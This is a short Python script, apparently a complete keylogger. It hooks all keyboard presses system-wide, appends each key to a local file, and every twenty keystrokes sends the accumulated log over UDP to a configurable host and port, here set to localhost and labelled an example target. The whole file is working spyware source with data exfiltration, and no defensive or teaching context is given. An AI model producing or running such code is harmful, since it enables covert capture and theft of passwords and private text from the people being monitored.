import keyboard
import socket

HOST = '127.0.0.1'  # Example target host
PORT = 3008        # Example target port
number_of_logs = 0
log_file = 'keystrokes.txt'

def on_key_press(event):
    global number_of_logs
    print("Key pressed")
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(str(event.name)))  # Cast to string
    number_of_logs += 1
    print("Number of logs:", number_of_logs)

    if number_of_logs == 20:
        print("Sending logs...")
        with open(log_file, 'rb') as f:  # Read the log file
            data = f.read()
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        client.sendto(data, (HOST, PORT))  # Send the actual content
        number_of_logs = 0
        print("Logs sent")

keyboard.on_press(on_key_press)
print("Listening for keystrokes...")
keyboard.wait()
